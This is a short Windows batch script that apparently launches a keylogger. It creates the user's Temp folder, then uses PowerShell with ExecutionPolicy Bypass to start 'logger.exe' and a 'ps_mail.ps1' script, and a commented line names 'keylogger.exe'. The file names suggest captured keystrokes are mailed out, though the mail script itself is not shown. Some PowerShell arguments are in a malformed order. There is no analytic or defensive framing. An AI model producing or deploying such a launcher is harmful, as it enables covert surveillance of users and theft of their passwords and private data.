

REM Make sure the Temp directory exists
IF NOT EXIST %userprofile%\AppData\Local\Temp mkdir %userprofile%\AppData\Local\Temp

REM Navigate to the Temp directory
cd %userprofile%\AppData\Local\Temp

REM Start the PowerShell script, using the appropriate interpreter
REM (e.g. "powershell" for a PowerShell script, "python" for a Python script)
rem start powershell -ExecutionPolicy Bypass -File .\ps_mail.ps1 -Command Start-Process 'keylogger.exe'
start powershell -command -ExecutionPolicy Bypass "logger.exe"
start powershell -command ".\ps_mail.ps1"